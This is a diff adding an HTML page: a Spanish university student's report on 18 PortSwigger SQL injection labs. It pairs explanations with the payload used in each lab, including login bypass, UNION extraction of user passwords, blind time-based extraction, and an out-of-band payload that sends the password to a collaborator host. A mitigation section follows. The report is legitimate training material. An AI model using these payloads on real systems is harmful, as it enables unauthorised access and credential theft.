@@ -1,0 +1,774 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>ACTIVIDAD 08 | PortSwigger SQL Injection Labs</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <style>
+        /* ESTILO PERSONALIZADO PARA EL MENÚ TIPO BARRA NEGRA */
+        #nav {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+            padding: 0.5em 0;
+        }
+
+        #nav ul li a {
+            color: #ffffff !important;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+
+        #nav ul li a:hover {
+            background-color: #333333;
+        }
+
+        /* Dropdown CSS Custom */
+        .dropdown-hover {
+            display: inline-block;
+            position: relative;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #000000;
+            min-width: 170px;
+            z-index: 1000;
+            top: 100%;
+            left: 0;
+            padding: 0;
+            margin: 0;
+            list-style: none;
+            border-radius: 4px;
+        }
+
+        .dropdown-content li {
+            display: block;
+        }
+
+        .dropdown-content li a {
+            color: #ffffff !important;
+            padding: 10px 15px !important;
+            text-decoration: none;
+            display: block;
+            font-size: 0.9em;
+        }
+
+        .dropdown-content li a:hover {
+            background-color: #333333 !important;
+        }
+
+        .dropdown-hover:hover .dropdown-content {
+            display: block;
+        }
+
+        hr {
+            border-top: solid 1px #ccc !important;
+            opacity: 1;
+            margin: 2em 0;
+        }
+
+        .content-article {
+            background: #ffffff;
+            padding: 3em;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+            overflow-x: auto;
+            color: #333333;
+        }
+
+        .content-article h2 {
+            color: #e63946;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        .content-article h3 {
+            color: #1d3557;
+            margin-top: 1.8em;
+            font-size: 1.4em;
+            border-left: 4px solid #e63946;
+            padding-left: 10px;
+        }
+
+        .content-article h4 {
+            color: #2c3e50;
+            font-size: 1.15em;
+            margin-top: 1.2em;
+            font-weight: bold;
+        }
+
+        .pdf-btn {
+            background-color: #d32f2f;
+            color: white !important;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 2em;
+            font-weight: bold;
+            transition: background-color 0.2s, transform 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .pdf-btn:hover {
+            background-color: #b71c1c;
+            transform: translateY(-2px);
+        }
+
+        /* Portada interna style */
+        .cover-info {
+            text-align: center;
+            margin-bottom: 3em;
+            padding: 2.5em;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+
+        .cover-info h1 {
+            font-size: 2em;
+            color: #1d3557;
+            margin-bottom: 0.5em;
+            font-weight: bold;
+        }
+
+        .cover-info h2 {
+            font-size: 1.3em;
+            color: #457b9d;
+            border-bottom: none;
+            margin-bottom: 0.5em;
+        }
+
+        .cover-info p {
+            margin: 0.3em 0;
+            color: #4a4a4a;
+            font-size: 1.05em;
+        }
+
+        /* Lab Dashboard Styling */
+        .dashboard-container {
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 1.5em;
+            margin: 2em 0;
+        }
+
+        .filter-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 1.5em;
+            background: #ffffff;
+            padding: 1em;
+            border-radius: 6px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .filter-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .filter-label {
+            font-size: 0.85em;
+            font-weight: bold;
+            color: #64748b;
+            text-transform: uppercase;
+        }
+
+        .btn-filter {
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            color: #475569;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-filter:hover {
+            background: #e2e8f0;
+        }
+
+        .btn-filter.active {
+            background: #e63946;
+            color: #ffffff;
+            border-color: #e63946;
+            box-shadow: 0 2px 4px rgba(230, 57, 70, 0.2);
+        }
+
+        .labs-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.5em;
+        }
+
+        @media screen and (max-width: 980px) {
+            .labs-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .lab-card {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 1.5em;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.02);
+            transition: all 0.3s ease;
+            border-top: 4px solid #cbd5e1;
+        }
+
+        .lab-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
+        }
+
+        .lab-card.apprentice {
+            border-top-color: #3b82f6;
+        }
+
+        .lab-card.practitioner {
+            border-top-color: #f59e0b;
+        }
+
+        .lab-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 0.8em;
+        }
+
+        .lab-title {
+            font-weight: bold;
+            font-size: 1em;
+            color: #1e293b;
+            margin: 0;
+        }
+
+        .badge-level {
+            font-size: 0.65em;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .badge-level.apprentice {
+            background: #dbeafe;
+            color: #1e40af;
+        }
+
+        .badge-level.practitioner {
+            background: #fef3c7;
+            color: #92400e;
+        }
+
+        .lab-type {
+            font-size: 0.75em;
+            font-weight: bold;
+            color: #64748b;
+            margin-bottom: 1em;
+            text-transform: uppercase;
+        }
+
+        .lab-detail-item {
+            font-size: 0.85em;
+            color: #475569;
+            margin-bottom: 0.8em;
+            line-height: 1.4;
+        }
+
+        .lab-detail-item strong {
+            color: #1e293b;
+        }
+
+        .lab-payload {
+            background: #0f172a;
+            color: #38bdf8;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.8em;
+            padding: 8px 12px;
+            border-radius: 4px;
+            word-break: break-all;
+            margin-top: 1em;
+            border-left: 3px solid #0ea5e9;
+        }
+
+        .lab-solved-indicator {
+            display: inline-flex;
+            align-items: center;
+            color: #10b981;
+            font-size: 0.75em;
+            font-weight: bold;
+            margin-top: 1em;
+        }
+
+        .info-cards {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5em;
+            margin: 2em 0;
+        }
+
+        @media screen and (max-width: 980px) {
+            .info-cards {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .info-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 1.5em;
+            border-left: 4px solid #1d3557;
+        }
+
+        .info-card h4 {
+            color: #1d3557;
+            margin-top: 0;
+            margin-bottom: 0.8em;
+            font-size: 1.1em;
+        }
+
+        .info-card p {
+            font-size: 0.9em;
+            margin: 0;
+            line-height: 1.4;
+            color: #475569;
+        }
+
+        @media print {
+            #nav, .pdf-btn, p style*="text-align: left", footer, .filter-bar {
+                display: none !important;
+            }
+            body {
+                background: white;
+                color: black;
+            }
+            .content-article {
+                box-shadow: none;
+                padding: 0;
+            }
+        }
+    </style>
+</head>
+
+<body class="is-preload">
+
+    <nav id="nav">
+        <ul class="container">
+            <li><a href="index.html">Inicio</a></li>
+            <li><a href="PF02.html">PF02</a></li>
+            <li><a href="PF03.html">PF03</a></li>
+            <li><a href="Final.html">Final</a></li>
+            <li><a href="actividades.html">Actividades</a></li>
+            <li><a href="proyectos.html">Proyectos</a></li>
+            <li><a href="certificaciones.html">Certificaciones</a></li>
+            <li class="dropdown-hover">
+                <a href="halloffame.html">Hall of Fame</a>
+                <ul class="dropdown-content">
+                    <li><a href="sqlinjection.html">SQL Injection</a></li>
+                </ul>
+            </li>
+        </ul>
+    </nav>
+
+    <article id="top" class="wrapper style1">
+        <div class="container">
+            <header>
+                <p style="text-align: left;"><a href="PF02.html">← Volver a PF02</a></p>
+                <h2>ACTIVIDAD 08: PORTSWIGGER SQL INJECTION LABS</h2>
+                <p>Análisis conceptual y bitácora técnica de 18 laboratorios de inyección SQL de nivel Apprentice y Practitioner.</p>
+            </header>
+
+            <div class="row">
+                <div class="col-12">
+                    <div class="content-article">
+
+                        <!-- Portada Académica -->
+                        <div class="cover-info">
+                            <h2>ACTIVIDAD 08</h2>
+                            <h1>REPORTE DE LABORATORIOS: PORTSWIGGER SQL INJECTION LABS</h1>
+                            <p><strong>Alumno:</strong> Alonso Castillo Omar Karim (179033)</p>
+                            <br>
+                            <p><strong>Materia:</strong> CNO V – Seguridad Informática</p>
+                            <p><strong>Profesor:</strong> Mtro. Servando López Contreras</p>
+                            <br>
+                            <p>Universidad Politécnica de San Luis Potosí</p>
+                        </div>
+
+                        <hr />
+
+                        <!-- Introducción -->
+                        <h3>Introducción y Fundamentos</h3>
+                        <p><strong>SQL Injection (SQLi)</strong> es una de las vulnerabilidades más críticas e históricas en el ámbito de la seguridad de aplicaciones web. Ocurre cuando una aplicación web inserta directamente entradas de usuario no sanitizadas dentro de una consulta SQL estructurada, permitiendo que el motor de base de datos interprete los datos del usuario como comandos ejecutables.</p>
+                        
+                        <p>El impacto de SQL Injection compromete de forma directa los tres pilares de la seguridad informática (CIA):</p>
+                        <div class="info-cards">
+                            <div class="info-card" style="border-left-color: #e63946;">
+                                <h4>Confidencialidad</h4>
+                                <p>Permite a atacantes exfiltrar información sensible de la base de datos, como credenciales de usuarios, contraseñas hash, información financiera o propiedad intelectual.</p>
+                            </div>
+                            <div class="info-card" style="border-left-color: #f59e0b;">
+                                <h4>Integridad</h4>
+                                <p>Permite la modificación no autorizada de registros, alteración de lógica de autenticación o la destrucción total del sistema de archivos de base de datos mediante borrado de tablas.</p>
+                            </div>
+                            <div class="info-card" style="border-left-color: #10b981;">
+                                <h4>Disponibilidad</h4>
+                                <p>Un atacante puede colapsar el sistema web inyectando funciones dinámicas pesadas (ataques basados en tiempo) o comandos destructivos de apagado del servidor.</p>
+                            </div>
+                        </div>
+
+                        <hr />
+
+                        <!-- Clasificación de Ataques -->
+                        <h3>Clasificación General de Ataques SQLi</h3>
+                        <p>Los ataques de inyección SQL se clasifican técnicamente bajo tres grandes vectores:</p>
+                        <ul>
+                            <li><strong>1. In-band (Classic SQLi):</strong> El atacante utiliza el mismo canal de comunicación para inyectar la carga útil y ver el resultado (ej. *Union-based* o *Error-based*).</li>
+                            <li><strong>2. Blind (Ciega):</strong> La aplicación no muestra mensajes de error ni datos de salida en la respuesta HTTP. El atacante debe inferir información realizando preguntas lógicas verdaderas/falsas (*Boolean-based*) o midiendo retrasos de tiempo inducidos en las consultas (*Time-based*).</li>
+                            <li><strong>3. Out-of-band:</strong> La exfiltración se realiza mediante un canal alterno controlado por el atacante (como consultas DNS o HTTP asíncronas detonadas por la base de datos).</li>
+                        </ul>
+
+                        <hr />
+
+                        <!-- Dashboard de Laboratorios -->
+                        <h3>Bitácora Técnica Interactiva de Laboratorios (18 Labs)</h3>
+                        <p>A continuación se expone el panel interactivo que resume los 18 laboratorios desarrollados en la **Web Security Academy de PortSwigger**. Utiliza la barra de filtros rápidos para segmentar la bitácora según su nivel de severidad:</p>
+
+                        <!-- Simulador del Dashboard -->
+                        <div class="dashboard-container">
+                            <div class="filter-bar">
+                                <div class="filter-group">
+                                    <span class="filter-label">Filtros:</span>
+                                    <button class="btn-filter active" onclick="filterLabs('all')">Todos</button>
+                                    <button class="btn-filter" onclick="filterLabs('apprentice')">Apprentice</button>
+                                    <button class="btn-filter" onclick="filterLabs('practitioner')">Practitioner</button>
+                                </div>
+                            </div>
+
+                            <div class="labs-grid" id="labsGrid">
+                                
+                                <!-- LAB 1 -->
+                                <div class="lab-card apprentice" data-level="apprentice">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 01</h4>
+                                        <span class="badge-level apprentice">Apprentice</span>
+                                    </div>
+                                    <div class="lab-type">SQLi in WHERE clause (hidden data)</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Explotar el parámetro de filtrado de categoría para mostrar productos no publicados.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Falta de validación que permite inyectar operadores lógicos para hacer que la consulta original WHERE evalúe como VERDADERA.</div>
+                                    <div class="lab-payload">?category=Gifts' OR 1=1--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 2 -->
+                                <div class="lab-card apprentice" data-level="apprentice">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 02</h4>
+                                        <span class="badge-level apprentice">Apprentice</span>
+                                    </div>
+                                    <div class="lab-type">Login Bypass</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Acceder a la cuenta de "administrator" en el formulario de login sin conocer la clave.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Inyección en el parámetro de entrada de usuario para anular y comentar la lógica de verificación de la contraseña.</div>
+                                    <div class="lab-payload">username: administrator'-- &amp; password: any</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 3 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 03</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Querying Version on Oracle</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Utilizar UNION para consultar el tipo de base de datos y su versión en Oracle.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Se requiere determinar el número de columnas (2) y rellenar la consulta inyectando la tabla del sistema de Oracle `v$version`.</div>
+                                    <div class="lab-payload">?category=Gifts' UNION SELECT banner, NULL FROM v$version--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 4 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 04</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Querying Version on MySQL/MSSQL</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Obtener la versión de la base de datos en entornos MySQL o Microsoft SQL Server.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Inyección Union-Based determinando las dos columnas e inyectando la variable del sistema de MySQL `@@version`.</div>
+                                    <div class="lab-payload">?category=Pets' UNION SELECT NULL, @@version--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 5 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 05</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Listing Database Contents (non-Oracle)</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Enumerar tablas, encontrar la tabla de usuarios, sus columnas y extraer la clave de administrador.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Mapeo dinámico e inyección sobre tablas del sistema `information_schema.tables` y `information_schema.columns`.</div>
+                                    <div class="lab-payload">?category=Gifts' UNION SELECT username_utpasc, password_spjiov FROM users_xpjxxo--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 6 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 06</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Listing Database Contents on Oracle</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Enumerar y exfiltrar usuarios y contraseñas desde una base de datos Oracle afectada.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Equivalente al Lab 5 pero interactuando con la tabla del sistema `all_tables` y `all_tab_columns` propias de Oracle.</div>
+                                    <div class="lab-payload">?category=Gifts' UNION SELECT username_column, password_column FROM users_table--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 7 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 07</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">UNION: Determining Column Count</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Identificar cuántas columnas regresa la consulta inyectando diferentes valores NULL.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> La consulta inyectada con UNION SELECT debe poseer el número exacto de columnas que la query original o dará error 500.</div>
+                                    <div class="lab-payload">?category=Gifts' UNION SELECT NULL, NULL, NULL--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 8 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 08</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">UNION: Finding Column with Text</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Encontrar cuál de las columnas devueltas por la consulta permite albergar texto.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Tras definir el número de columnas (3), se reemplaza cada NULL individualmente con una cadena de prueba.</div>
+                                    <div class="lab-payload">?category=Gifts' UNION SELECT NULL, 'abcdef', NULL--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 9 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 09</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">UNION: Retrieving Data from Tables</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Exfiltrar las contraseñas de la tabla de usuarios utilizando la técnica UNION.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Explotación Union-Based dirigida hacia la tabla `users` tras identificar que cuenta con dos columnas que aceptan texto.</div>
+                                    <div class="lab-payload">?category=Gifts' UNION SELECT username, password FROM users--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 10 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 10</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">UNION: Multiple Values in Single Column</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Extraer nombres y claves cuando la consulta original solo expone una única columna utilizable.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Concatenación de campos usando operadores específicos de cadenas (como `||` en Oracle o `CONCAT` en MySQL).</div>
+                                    <div class="lab-payload">?category=Gifts' UNION SELECT NULL, username || '~' || password FROM users--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 11 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 11</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Blind SQLi with Conditional Responses</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Obtener la contraseña de administrador infiriendo cada carácter mediante respuestas condicionales.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Inyección sobre cookie de rastreo. La aparición del texto "Welcome back!" confirma si la subconsulta booleana inyectada fue verdadera.</div>
+                                    <div class="lab-payload">TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 12 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 12</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Blind SQLi with Conditional Errors</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Extraer la contraseña induciendo errores controlados en bases de datos que no varían su respuesta.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Se inyecta una condición que genera división por cero o error de sintaxis nativa (ej. `CASE WHEN`) si la letra evaluada es correcta.</div>
+                                    <div class="lab-payload">TrackingId=xyz' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 13 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 13</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Visible Error-Based SQLi</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Extraer datos sensibles directamente forzando a que la base de datos los muestre en el mensaje de error.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Uso de funciones de conversión o XML del motor para causar fallos de conversión de datos que expongan la variable.</div>
+                                    <div class="lab-payload">TrackingId=xyz' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 14 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 14</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Blind SQLi with Time Delays</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Confirmar la inyección forzando al motor a pausar su respuesta durante 10 segundos.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Uso de funciones durmientes en consultas ciegas como `pg_sleep()` en PostgreSQL o `sleep()` en MySQL.</div>
+                                    <div class="lab-payload">TrackingId=xyz'||pg_sleep(10)--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 15 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 15</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Blind SQLi with Time Delays &amp; Info Retrieval</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Extraer caracteres condicionalmente utilizando pausas de tiempo controladas.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Se combina una pregunta binaria con un retardo temporal. Si el primer carácter es correcto, se dispara un retardo de 10s.</div>
+                                    <div class="lab-payload">TrackingId=xyz'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 16 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 16</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Blind SQLi with Out-Of-Band Interaction</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Detonar una interacción DNS con un servidor externo para comprobar el fallo.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Uso de funciones de búsqueda externa como `extractvalue` o peticiones DNS nativas sobre dominios controlados por Burp Collaborator.</div>
+                                    <div class="lab-payload">TrackingId=xyz'+UNION+SELECT+extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://collaborator-link"&gt; %remote;]&gt;'),'/l')--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 17 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 17</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Blind SQLi with Out-Of-Band &amp; Info Retrieval</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Exfiltrar la contraseña del administrador enviando el valor codificado dentro de un subdominio DNS.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Redirección y exfiltración DNS asíncrona concatenando la variable de contraseña en la consulta DNS externa.</div>
+                                    <div class="lab-payload">TrackingId=xyz' UNION SELECT extractvalue(xmltype('&lt;?xml... SYSTEM "http://' || password || '.collaborator-link"&gt;...'),'/l')--</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                                <!-- LAB 18 -->
+                                <div class="lab-card practitioner" data-level="practitioner">
+                                    <div class="lab-header">
+                                        <h4 class="lab-title">Laboratorio 18</h4>
+                                        <span class="badge-level practitioner">Practitioner</span>
+                                    </div>
+                                    <div class="lab-type">Filter Bypass via XML Encoding</div>
+                                    <div class="lab-detail-item"><strong>Objetivo:</strong> Explotar inyección SQL en formularios web que filtran peticiones comunes, evadiendo la firma del WAF.</div>
+                                    <div class="lab-detail-item"><strong>Explicación:</strong> Codificación del payload mediante entidades numéricas hexadecimales en XML (XML Entity Encoding) que la base de datos decodifica automáticamente.</div>
+                                    <div class="lab-payload">&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1 UNION SELECT username || '~' || password FROM users&lt;/storeId&gt;&lt;/stockCheck&gt;</div>
+                                    <div class="lab-solved-indicator"><i class="icon solid fa-check-circle" style="margin-right: 5px;"></i> Lab Solved</div>
+                                </div>
+
+                            </div>
+                        </div>
+
+                        <hr />
+
+                        <!-- Principios de Defensa -->
+                        <h3>Principios de Defensa y Mitigación Definitiva</h3>
+                        <p>La mitigación de SQL Injection es conceptualmente simple pero exige consistencia y disciplina en el ciclo de vida de desarrollo seguro (S-SDLC):</p>
+                        <ul>
+                            <li><strong>Consultas Parametrizadas (Sentencias Preparadas):</strong> La defensa número uno. Separan estrictamente la estructura del comando SQL de los datos ingresados por el usuario. La base de datos trata el payload estrictamente como un literal de texto y nunca como código ejecutable.</li>
+                            <li><strong>Validación Estricta de Entradas (Listas Blancas):</strong> Filtrado exhaustivo a nivel de tipo de datos, longitud y formato esperado antes de enviar cualquier información a la query.</li>
+                            <li><strong>Principio de Mínimo Privilegio:</strong> Configurar las cuentas de acceso del servicio web a la base de datos con permisos estrictamente acotados (lectura/escritura en tablas necesarias), previniendo consultas cruzadas a tablas del sistema.</li>
+                            <li><strong>Manejo Seguro de Errores:</strong> Deshabilitar mensajes de error detallados en producción para evitar fugas de información útiles para ataques *Error-based*.</li>
+                        </ul>
+
+                        <!-- PDF Download Section -->
+                        <div style="text-align: center; margin-top: 3.5em; border-top: 1px solid #eee; padding-top: 2em;">
+                            <p style="font-size: 0.95em; color: #666;">¿Deseas consultar el reporte completo de los 18 laboratorios de SQL Injection en formato PDF?</p>
+                            <a href="Actividades/act8.pdf" class="pdf-btn" download>
+                                <i class="icon solid fa-file-pdf" style="margin-right: 8px;"></i> Descargar PDF Original (act8.pdf)
+                            </a>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article class="wrapper style4">
+        <div class="container medium">
+            <footer>
+                <ul id="copyright">
+                    <li>&copy; Alonso Castillo Omar Karim. Todos los derechos reservados.</li>
+                    <li>Diseño base: <a href="http://html5up.net">HTML5 UP</a></li>
+                </ul>
+            </footer>
+        </div>
+    </article>
+
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.scrolly.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+
+    <!-- JS de filtrado de Laboratorios -->
+    <script>
+        function filterLabs(level) {
+            // Actualizar clase activa de los botones
+            const buttons = document.querySelectorAll('.btn-filter');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            
+            // Encontrar el botón clickeado
+            const clickedBtn = event.target;
+            clickedBtn.classList.add('active');
+
+            // Filtrar las tarjetas de laboratorios
+            const cards = document.querySelectorAll('.lab-card');
+            cards.forEach(card => {
+                if (level === 'all') {
+                    card.style.display = 'block';
+                } else {
